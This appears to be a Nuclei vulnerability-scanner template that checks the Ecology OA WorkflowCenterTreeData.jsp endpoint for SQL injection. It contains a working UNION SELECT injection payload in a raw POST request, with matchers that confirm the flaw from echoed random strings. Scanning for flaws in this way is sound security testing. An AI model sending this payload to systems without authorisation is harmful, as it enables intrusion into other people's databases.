id: ecology-workflowcentertreedata-sqli

info:
  name: Ecology Workflowcentertreedata SQLI
  author: ritikchaddha
  severity: high
  reference:
    - https://mp.weixin.qq.com/s/9mpvppx3F-nTQYoPdY2r3w
  tags: ecology,sqli

requests:
  - raw:
      - |
        POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        formids=11111111111)))%0a%0dunion%20select%20NULL,concat('{{to_lower("{{randstr_1}}")}}','{{to_lower("{{randstr_2}}")}}')%20from%20v$parameter%20order%20by%20(((1

    redirects: true
    max-redirects: 2
    matchers-condition: and
    matchers:

      - type: word
        part: body
        words:
          - '{{to_lower("{{randstr_1}}")}}{{to_lower("{{randstr_2}}")}}'

      - type: status
        status:
          - 200
